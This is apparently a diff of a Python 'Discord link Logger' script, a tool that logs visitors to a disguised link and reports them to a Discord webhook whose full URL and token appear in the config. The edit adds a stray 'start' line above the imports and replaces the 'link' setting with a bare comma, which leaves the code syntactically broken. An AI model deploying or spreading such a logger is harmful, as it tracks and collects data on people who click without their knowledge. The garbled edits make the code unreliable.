@@ -1,7 +1,7 @@
 
 # Discord link Logger
 # By DeKrypt | https://github.com/dekrypted
-
+start https://ngl.link/mathews_pvrt1"
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1212166604524093512/ech7jp7lC_5rRbZVVCQoQLlpCBe3mcxfoNLUcZmnOVfjcBdEIQS6fMNSjfdoyu--7WU1",
-    "link": "https://ngl.link/mathews_pvrt1", # You can also have a custom link by using a URL argument
+, # You can also have a custom link by using a URL argument
                                                # (E.g. yoursite.com/linklogger?url=<Insert a URL-escaped link to an linklinklink here>)
     "linkArgument": True, # Allows you to use a URL argument to change the link (SEE THE README)
 
